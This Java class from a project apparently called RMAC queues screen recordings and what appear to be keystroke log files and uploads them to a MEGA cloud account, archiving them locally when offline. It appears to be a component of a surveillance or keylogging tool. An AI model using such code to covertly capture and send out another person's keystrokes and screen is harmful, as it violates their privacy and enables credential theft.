package com.rmac.core;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Uploadable;
import java.io.File;
import java.util.PriorityQueue;
import java.util.Queue;
import lombok.extern.slf4j.Slf4j;

/**
 * Queues and uploads files to associated MEGA account according to file type priority
 *
 * @see com.rmac.utils.ArchiveFileType
 */
@Slf4j
public final class FileUploader {

  // Queue of files ready to be uploaded
  private final Queue<Uploadable> queue = new PriorityQueue<>();
  /**
   * Active uploads count to cap parallel uploads to defined <i>MaxParallelUploads</i> config
   * property
   */
  private int runningUploads = 0;

  /**
   * Start the MEGA cli server and login using defined user/pass config properties
   */
  public FileUploader() {
    if (MegaClient.startServer()) {
      MegaClient.login(RMAC.config.getMegaUser(), RMAC.config.getMegaPass(), false);
    }
  }

  /**
   * Upload the given file or archive it to <code>/archives</code> directory when uploads are
   * disabled or network is down.
   *
   * @param fileToUpload The file to upload to MEGA.
   * @param type         File type.
   * @see com.rmac.utils.ArchiveFileType
   */
  public void uploadFile(File fileToUpload, ArchiveFileType type) {
    boolean archive = false;
    if (!Connectivity.checkNetworkState()) {
      if (type == ArchiveFileType.ARCHIVE) {
        log.warn("Skipping already archived file");
        return;
      }
      archive = true;
    }

    if ((type == ArchiveFileType.SCREEN && !RMAC.config.getVideoUpload()) ||
        (type == ArchiveFileType.KEY && !RMAC.config.getLogFileUpload())) {
      archive = true;
    }

    if (archive) {
      RMAC.archiver.moveToArchive(fileToUpload.getAbsolutePath(), type);
      return;
    }

    Uploadable uploadable = new Uploadable(fileToUpload, type,
        (ignored) -> uploadComplete());
    queue.add(uploadable);

    doUploads();
  }

  /**
   * Decrease active uploads count.
   */
  private synchronized void uploadComplete() {
    runningUploads -= 1;
    doUploads();
  }

  /**
   * Increase active uploads count.
   */
  private synchronized void uploadStarted() {
    runningUploads += 1;
  }

  /**
   * Take sufficient files out of the queue and start their uploads, only when max parallel uploads
   * cap has not reached.
   */
  private synchronized void doUploads() {
    while (runningUploads < RMAC.config.getMaxParallelUploads()) {
      Uploadable u = queue.poll();
      if (u != null) {
        u.execute();
        uploadStarted();
      } else {
        break;
      }
    }
  }
}
